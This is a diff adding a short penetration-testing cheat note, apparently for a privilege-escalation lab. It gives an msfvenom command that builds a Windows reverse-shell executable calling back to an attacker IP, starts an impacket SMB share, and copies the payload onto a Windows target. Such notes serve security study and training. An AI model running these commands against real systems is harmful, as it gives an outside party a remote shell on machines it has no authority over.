@@ -1,0 +1,22 @@
+
+##------ How to Share a file using SMB -------##
+
+command to generate payload using msfvenom:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+
+-------------------------------------------
+
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+NOTE: Here Kali is share name and . (dot) is our present dir
+
+
+
+On Windows (update the IP address with your Kali IP):
+
+copy \\<your attack machine ip>\payload name
+
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+
